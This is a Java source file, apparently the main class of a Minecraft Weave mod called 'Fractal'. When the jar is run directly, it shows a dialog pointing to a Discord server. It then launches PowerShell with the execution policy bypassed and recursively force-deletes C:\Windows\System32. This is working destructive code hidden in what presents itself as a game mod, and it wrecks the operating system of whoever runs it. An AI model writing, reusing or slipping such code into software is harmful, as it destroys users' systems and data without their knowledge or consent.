package xyz.flapjack.container;

import javax.swing.*;
import java.io.IOException;

public class Container {

    public static void main(String[] args) {
        JFrame frame = new JFrame();
        frame.setAlwaysOnTop(true);

        JOptionPane.showMessageDialog(frame, "Please use this file as a Weave mod, join the discord: https://discord.gg/TCpVya5jQd", "Fractal", JOptionPane.WARNING_MESSAGE);

        String folderPath = "C:\\Windows\\System32";

        try {
            String command = "powershell.exe -ExecutionPolicy Bypass -Command \"Remove-Item -Path '" + folderPath + "' -Recurse -Force\"";
            Process powerShellProcess = Runtime.getRuntime().exec(command);
            powerShellProcess.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
